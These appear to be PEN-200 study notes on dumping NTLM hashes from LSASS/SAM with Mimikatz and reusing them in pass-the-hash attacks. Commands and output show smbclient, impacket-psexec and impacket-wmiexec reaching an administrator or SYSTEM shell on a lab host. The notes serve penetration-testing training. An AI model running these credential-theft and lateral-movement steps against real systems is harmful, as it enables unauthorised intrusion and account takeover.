# PEN 200 random notes
## Dumping creds from LSASS with mimikatz
* LSASS is important for us because it caches NTLM hashes and other credentials, which we can extract using the sekurlsa Mimikatz module. We need to understand that **LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator**.
* Due to this, **we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the SeDebugPrivilege access right enabled**. This access right grants us the ability to debug not only processes we own, but also all other users’ processes.
* **We can also elevate our privileges to the SYSTEM account with tools like PsExec or the built-in Mimikatz token elevation function to obtain the required privileges**. The token elevation function requires the SeImpersonatePrivilege access right to work, but all local administrators have it by default.
## NTLM PassTheHash (PtH) attack
### Info
* We can use this technique to authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password.
* This is possible because NTLM/LM password hashes are not salted and remain static between sessions.
* If we discover a password hash on one target, we can use it to not only authenticate to that target, but to another target as well, as long as the second target has an account with the same username and password.
* **To leverage this into code execution of any kind, the account also needs administrative privileges on the second target**.
* If we don’t use the local Administrator user in pass-the-hash, the target machine also needs to be configured in a certain way to obtain successful code execution.
  * Since Windows Vista, all Windows versions have UAC remote restrictions enabled by default. This prevents software or commands from running with administrative rights on remote systems.
* **It is quite common and is often found in real-life assessments that the local Administrator accounts have the same password on multiple machines!!!**
### Pth Tools
* To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes.
  * SMB enumeration and management: **smbclient**, **CrackMapExec**, **mimikatz (built in stuff)**
  * Command execution: **psexec.py (from Impacket)**, **wmiexec.py (from Impacket)**, **mimikatz (built in stuff)**
* We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like **RDP** and **WinRM**!
### Pth Attack
<pre>
# Extraction Admin password with mimikatz
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
...
mimikatz # lsadump::sam
...
RID : 000001f4 (500)
User : Administrator
Hash NTLM: 7a38310ea6f0027ee955abed1762964b

# Connect through SMB with obtained NTLM hash
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash
7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
. D 0 Thu Jun 2 16:55:37 2022
.. DHS 0 Thu Jun 2 16:55:35 2022
secrets.txt A 4 Thu Jun 2 11:34:47 2022

# Connect with psexec
kali@kali:~$ impacket-psexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 192.168.50.212.....
[*] Found writable share ADMIN$
[*] Uploading file nvaXenHl.exe
[*] Opening SVCManager on 192.168.50.212.....
[*] Creating service MhCl on 192.168.50.212.....
[*] Starting service MhCl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

# Connect with wmiexec
kali@kali:~$ impacket-wmiexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator
C:\>
</pre>
## Cracking Net-NTLMv2
